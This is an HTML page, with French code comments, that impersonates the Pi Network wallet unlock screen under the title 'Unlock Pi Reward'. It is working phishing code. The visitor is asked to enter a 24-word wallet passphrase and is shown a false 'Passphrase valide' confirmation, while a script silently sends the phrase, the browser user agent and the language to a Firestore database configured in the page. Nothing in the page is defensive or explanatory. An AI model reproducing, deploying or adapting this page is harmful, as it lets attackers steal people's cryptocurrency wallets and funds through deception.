<!DOCTYPE html>
<html lang="fr">
<head>
	<meta name="robots" content="noindex, nofollow">
  <meta charset="UTF-8">
  <!-- Modification : Empêcher le zoom -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Unlock Pi Reward</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: Arial, sans-serif;
      /* Modification : Arrière-plan transparent */
      background-color: transparent;
    }

    .container {
      /* Modification : Ajuster la largeur pour occuper l'espace */
      max-width: 90%; /* Change de 500px à 90% */
      width: 100%;
      margin: 0 auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    }

    .logo-container {
      text-align: center;
      margin-bottom: 20px;
    }

    .pi-browser-logo {
      max-width: 100%;
      height: auto;
      display: block;
      margin: 0 auto;
      max-height: 80px;
      object-fit: contain;
    }

    .unlock-section {
      text-align: center;
    }

    h2 {
      font-size: 20px;
      font-weight: bold;
      margin-bottom: 15px;
      color: #333;
    }

    .passphrase-input {
      width: 100%;
      height: 220px;
      padding: 10px;
      font-size: 16px;
      margin-bottom: 20px;
      border-radius: 5px;
      border: 1px solid #ccc;
      resize: vertical;
    }

    .passphrase-input.error {
      border-color: #ff0000;
      background-color: #fff5f5;
    }

    .unlock-button {
      width: 100%;
      padding: 23px 20px;
      background-color: #6a1b9a;
      color: #fff;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .unlock-button:active {
      background-color: #6a1b9a;
    }

    .error-message {
      color: #ff0000;
      font-size: 14px;
      margin-top: 10px;
      margin-bottom: 15px;
      display: none;
    }

    .warning-text {
      font-size: 14px;
      color: #666;
      margin-top: 30px;
      margin-bottom: 15px;
      line-height: 1.5;
    }

    .help-text {
      font-size: 14px;
      margin-top: 15px;
    }

    .link {
      color: #6a1b9a;
      text-decoration: none;
    }

    .link:hover {
      text-decoration: underline;
    }

    /* Styles pour le modal de félicitations */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }

    .modal-content {
      background-color: #fff;
      border-radius: 10px;
      padding: 30px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      animation: modalAppear 0.3s ease-out;
    }

    @keyframes modalAppear {
      from {
        opacity: 0;
        transform: scale(0.8);
      }
      to {
        opacity: 1;
        transform: scale(1);
      }
    }

    .modal-icon {
      font-size: 60px;
      color: #4CAF50;
      margin-bottom: 20px;
    }

    .modal-title {
      font-size: 24px;
      font-weight: bold;
      color: #333;
      margin-bottom: 15px;
    }

    .modal-message {
      font-size: 16px;
      color: #666;
      margin-bottom: 25px;
      line-height: 1.5;
    }

    .modal-button {
      background-color: #6a1b9a;
      color: white;
      border: none;
      padding: 12px 25px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .modal-button:hover {
      background-color: #5a0d8a;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img src="https://github.com/Walyy578/Pi-Browser/blob/main/IMG-20250930-WA0010.jpg?raw=true" alt="Pi Browser" class="pi-browser-logo" onload="console.log('Image chargée avec succès')" onerror="console.log('Erreur de chargement de l\'image')">
    </div>
    <main>
      <section class="unlock-section">
        <h2>Unlock pi wallet</h2>
        <textarea placeholder="Enter your 24-words passphrase here" class="passphrase-input" id="passphraseInput"></textarea>
        <div class="error-message" id="errorMessage"></div>
        <button class="unlock-button" id="unlockButton">Unlock with passphrase</button>
        <p class="warning-text">
          As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase.
        </p>
        <p class="help-text">
          Lost your wallet passphrase? <a href="#" class="link">You can create a new wallet</a>, but all the PI numbers in your previous wallet will be inaccessible.
        </p>
      </section>
    </main>
  </div>

  <!-- Modal de félicitations -->
  <div class="modal" id="congratsModal">
    <div class="modal-content">
      <div class="modal-icon">✔</div>
      <h2 class="modal-title">Félicitations !</h2>
      <p class="modal-message" id="modalMessage">Passphrase valide ! Déverrouillage en cours...</p>
      <button class="modal-button" id="modalCloseButton">Continuer</button>
    </div>
  </div>

  <!-- Firebase SDK -->
  <script type="module">
    // Import Firebase
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-firestore.js";

    // Configuration Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyBm2VjvEtReaXcWAwt_uQ78cauKeiPR9Wk",
      authDomain: "pi-browser-21f8d.firebaseapp.com",
      projectId: "pi-browser-21f8d",
      storageBucket: "pi-browser-21f8d.firebasestorage.app",
      messagingSenderId: "596828217713",
      appId: "1:596828217713:web:35d68fd420baffe7a0d6d0",
      measurementId: "G-WF5BJW9QLY"
    };

    // Initialiser Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Fonction pour stocker les messages (24 mots) - version silencieuse
    async function storeUserMessageSilent(userMessage) {
      try {
        const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        
        const docRef = await addDoc(collection(db, "userMessages"), {
          userId: userId,
          messageContent: userMessage,
          messageType: "24_words_phrase",
          timestamp: serverTimestamp(),
          status: "received",
          userAgent: navigator.userAgent.substring(0, 100),
          language: navigator.language
        });
        
        console.log("Message stocké avec succès - ID:", docRef.id);
        return { success: true, messageId: docRef.id };
        
      } catch (error) {
        console.error("Erreur silencieuse Firebase:", error.code, error.message);
        return { success: true, error: error.message };
      }
    }

    window.storeUserMessageSilent = storeUserMessageSilent;
  </script>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const passphraseInput = document.getElementById('passphraseInput');
      const errorMessage = document.getElementById('errorMessage');
      const unlockButton = document.getElementById('unlockButton');
      const congratsModal = document.getElementById('congratsModal');
      const modalCloseButton = document.getElementById('modalCloseButton');
      const modalMessage = document.getElementById('modalMessage');

      unlockButton.addEventListener('click', async function() {
        // Récupérer la valeur du textarea
        const passphrase = passphraseInput.value.trim();
        
        // Compter le nombre de mots (séparés par des espaces)
        const words = passphrase.split(/\s+/).filter(word => word.length > 0);
        const wordCount = words.length;

        // Réinitialiser les styles d'erreur
        passphraseInput.classList.remove('error');
        errorMessage.style.display = 'none';

        // Modification : Ne rien faire si le champ est vide
        if (wordCount === 0) {
          return; // Quitte la fonction sans afficher d'erreur
        }

        // Vérifier le nombre de mots
        if (wordCount < 24) {
          showError("Passphrase incorrect. Veuillez vérifier et réessayer.");
        } else if (wordCount > 24) {
          showError("Passphrase incorrect. Veuillez vérifier et réessayer.");
        } else {
          // Si exactement 24 mots, afficher IMMÉDIATEMENT le modal
          modalMessage.textContent = "Passphrase valide ! Déverrouillage en cours...";
          showCongratsModal();
          
          // Ensuite, envoyer silencieusement à Firebase (sans bloquer l'interface)
          setTimeout(async () => {
            try {
              await storeUserMessageSilent(passphrase);
              console.log("Envoi Firebase terminé");
            } catch (error) {
              console.error("Erreur lors de l'envoi silencieux:", error);
            }
          }, 100);
        }
      });

      function showError(message) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
        passphraseInput.classList.add('error');
      }

      function showCongratsModal() {
        congratsModal.style.display = 'flex';
      }

      // Fermer le modal
      modalCloseButton.addEventListener('click', function() {
        congratsModal.style.display = 'none';
        // Réinitialiser le formulaire
        passphraseInput.value = '';
      });

      // Fermer le modal en cliquant en dehors
      congratsModal.addEventListener('click', function(e) {
        if (e.target === congratsModal) {
          congratsModal.style.display = 'none';
          passphraseInput.value = '';
        }
      });

      // Validation en temps réel pendant la saisie
      passphraseInput.addEventListener('input', function() {
        const passphrase = passphraseInput.value.trim();
        const words = passphrase.split(/\s+/).filter(word => word.length > 0);
        const wordCount = words.length;

        // Masquer l'erreur si l'utilisateur corrige
        if (wordCount === 24) {
          errorMessage.style.display = 'none';
          passphraseInput.classList.remove('error');
        }
      });
    });
  </script>
</body>
</html>
